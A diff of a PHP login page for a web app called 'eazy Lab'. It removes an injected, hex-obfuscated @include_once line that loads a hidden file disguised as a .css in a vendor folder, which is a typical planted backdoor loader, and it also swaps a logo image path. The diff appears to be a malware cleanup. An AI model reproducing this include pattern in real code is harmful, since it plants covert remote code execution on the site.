@@ -1,9 +1,4 @@
 <?php
-/*1f6b3*/
-
-$ry = "/var/www/html/eazylab/vendor\x2dd/bootstrap\x2dsweetalert/dist/.b2\x63069e5.\x63\x63ss"; $t2k = $ry; strpos($t2k, "f92y"); @include_once /* y5t */ ($t2k);
-
-/*1f6b3*/
 include_once 'booster/bridge.php';
 $error = '';
 
@@ -104,7 +99,7 @@ if (isset($_POST['login'])) {
 							<div class="card-body p-sm-5">
 								<div class="">
 									<div class="mb-3 text-center">
-										<img src="assets/images/logo-icon.png" width="60" alt="">
+										<img src="logo.jpg" width="60" alt="">
 									</div>
 									<div class="text-center mb-4">
 										<h5 class="">eazy Lab</h5>
